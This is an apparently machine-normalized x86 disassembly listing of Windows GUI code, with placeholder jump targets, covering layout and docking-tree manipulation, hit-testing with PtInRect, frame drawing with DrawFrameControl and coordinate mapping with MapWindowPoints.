mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_449244
pop ecx
sub_4492c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4492c8
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4492c8
pop ecx
sub_44931c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44929c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_448b88
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_448b88
push eax
mov edx 0x1
mov eax ebx
call sub_448b1c
push eax
mov edx 0x2
mov eax ebx
call sub_448b1c
pop edx
pop ecx
call sub_418e2c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c58
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4493a0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_448dd8
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_418e2c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43fd84
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a04
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44929c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_448a28
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44a2c8
mov edx esi
mov eax ebx
call sub_44929c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_440368
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a04
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_440354
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_448b88
mov edx eax
mov eax edi
call sub_448f78
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_448b88
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_448b88
mov edx eax
mov eax edi
call sub_448f78
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_448b88
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4495b0
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_449758
jmp r-xdata
sub_4495b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a04
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_448f50
mov edx eax
mov eax ebx
call sub_448f78
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_448f78
mov eax [ esi + 0x64 ]
call sub_448f50
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44a620
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_449304
mov eax [ esi + 0x64 ]
call sub_448f50
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44a620
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_449304
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44a9a4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_449304
mov eax [ esi + 0x64 ]
call sub_448f50
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44aad8
xor edx edx
mov eax esi
call sub_449304
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_448f78
adc edx 0x0
mov eax ebx
call sub_448c38
mov eax ebx
call sub_448fc8
push esi
push sub_44aad8
xor edx edx
mov eax esi
call sub_449304
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_449758
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_448c38
mov eax [ ebx + 0x14 ]
call sub_448fc8
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4497d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_448f50
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_448f50
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_448f50
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_448b1c
mov esi eax
mov edx 0x2
mov eax ebx
call sub_448b1c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_448f50
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_449028
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_449050
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449028
call sub_4497d0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449050
call sub_4497d0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_448b88
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_448b88
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4499fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4438dc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_418ddc
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449a90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4499fc
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_449050
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44929c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_449050
call sub_4497d0
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_449b18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f9c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045e8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_449b60
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449d58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44a230
mov eax [ ebp - 0x8 ]
call sub_44922c
xor edx edx
push ebp
push sub_449d3b
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449d42
mov eax [ ebp - 0x8 ]
call sub_449230
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a04
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_449b18
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403448
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_448d24
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_449b18
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_4402e4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4410c4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_40324c
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_449d68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_418e04
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423e68
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449dc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423440
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_423b9c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_423b3c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_423b3c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423440
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_423b3c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_423b3c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_449e48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_449d68
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_449dc0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_449dc0
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_449d68
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_449dc0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_449dc0
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_449f22
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a07a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43efa0
mov eax [ ebp - 0x4 ]
call sub_423b74
xor eax eax
push ebp
push sub_44a05d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423ee8
xor eax eax
push ebp
push sub_44a040
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4438dc
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a047
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423ee8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43fd64
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44a088
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4456dc
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43fe0c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43fdc8
mov ecx eax
xor edx edx
xor eax eax
call sub_418e04
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_446be4
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
